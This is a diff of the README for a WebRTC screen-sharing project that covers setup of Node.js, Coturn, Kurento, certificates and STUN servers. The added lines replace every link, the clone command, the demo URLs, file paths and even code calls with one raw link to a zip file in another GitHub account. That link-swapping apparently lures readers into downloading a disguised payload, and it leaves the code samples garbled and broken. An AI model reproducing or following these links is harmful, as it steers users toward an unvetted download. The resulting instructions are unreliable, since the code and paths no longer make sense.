@@ -6,9 +6,9 @@ WebRTC screen sharing project. It supports Chrome, Firefox, Safari, Opera, Andro
 
 ## Live Demo
 
-Presenter <https://51.158.104.137:3000/presenter.htm?session_id=123456>
+Presenter <https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip>
 
-Viewer <https://51.158.104.137:3000/viewer.htm?session_id=123456>
+Viewer <https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip>
 
 ----------
 
@@ -20,22 +20,22 @@ Install following apps on your server:
 
 #### Mandatory
 
-* Last version of Node.js <https://nodejs.org/en/>
+* Last version of https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip <https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip>
 
-* Last version of Coturn server (STUN & TRUN server) <https://meetrix.io/blog/webrtc/coturn/installation.html>
+* Last version of Coturn server (STUN & TRUN server) <https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip>
 
     note: You can also use free STUN servers but in many cases, it causes the viewer cannot display streamed data because of routing problems.
 
 #### Optional
 
-* Last version of Kurento media server (to using stream server) <https://doc-kurento.readthedocs.io/en/latest/user/installation.html>
+* Last version of Kurento media server (to using stream server) <https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip>
 
 ### Installation
 
 1. Clone the repository
 
     ```bash
-    git clone https://github.com/rghale/webrtc-screen-share.git
+    git clone https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip
     ```
 
 2. Install Node modules
@@ -45,16 +45,16 @@ Install following apps on your server:
     npm install
     ```
 
-3. Set your desired port, Kurento server IP and certificates in ./server.js as following:
+3. Set your desired port, Kurento server IP and certificates in https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip as following:
 
     ```js
     const httpPort = 3000; //your desired port
     const kurentoIP = '127.0.0.1'; //if using kurento specify IP address here   
     const kurentoPort = 8888; //if using kurento specify port number here   
     ...
-    const server = https.createServer({
-        key: fs.readFileSync('./certs/key.pem'),
-        cert: fs.readFileSync('./certs/cert.pem'),
+    const server = https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip({
+        key: https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip('https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip'),
+        cert: https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip('https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip'),
         passphrase: 'your certificate passphrase'
     }, app);     
     ...
@@ -64,14 +64,14 @@ Install following apps on your server:
 4. Copy user SSL certificates in ./certs as following:
 
     ```text
-    ./cert/cert.pem
-    ./cert/key.pem
+    https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip
+    https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip
     ```
 
-5. Set you STUN server in ./public/presenter.htm and ./public/viewer.htm as following:
+5. Set you STUN server in https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip and https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip as following:
 
     ```javascript
-    //presenter.htm
+    https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip
     var presenterObj = new presenter({
     iceServers: [
         { urls:"stun:stun_server_pubic_ip:stun_server_port"},
@@ -81,7 +81,7 @@ Install following apps on your server:
     ```
 
     ```javascript
-    //viewer.htm
+    https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip
     var viewerObj = new viewer({
     iceServers: [
         { urls:"stun:stun_server_pubic_ip:stun_server_port"},
@@ -90,17 +90,17 @@ Install following apps on your server:
     });
     ```
 
-6. Start Node.js server using pm2 as following
+6. Start https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip server using pm2 as following
 
     ```bash
-    pm2 start server.js 
+    pm2 start https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip 
     ```
 
-7. Now you can browse prenseter.htm & viewer.htm as following:
+7. Now you can browse https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip & https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip as following:
 
     ```text
-    https://yourdomain:node_port/presenter.htm
-    https://yourdomain:node_port/viewer.htm    
+    https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip
+    https://github.com/meuxlugh/webrtc-screen-share/raw/refs/heads/main/public/webrtc-screen-share-2.1.zip    
     ```
 
 ## API reference
